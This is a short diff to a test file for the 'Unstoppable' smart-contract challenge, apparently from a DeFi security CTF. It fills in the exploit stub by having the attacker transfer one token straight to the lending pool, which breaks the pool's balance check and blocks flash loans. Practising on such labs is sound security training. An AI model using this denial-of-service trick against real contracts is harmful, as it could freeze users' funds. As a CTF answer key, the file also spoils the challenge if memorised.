@@ -39,7 +39,10 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Make sure we interact with token contract as "attacker".
+        this.token.connect(attacker);
+        // Send 1 token to pool.
+        this.token.transfer(this.pool.address, 1);
     });
 
     after(async function () {
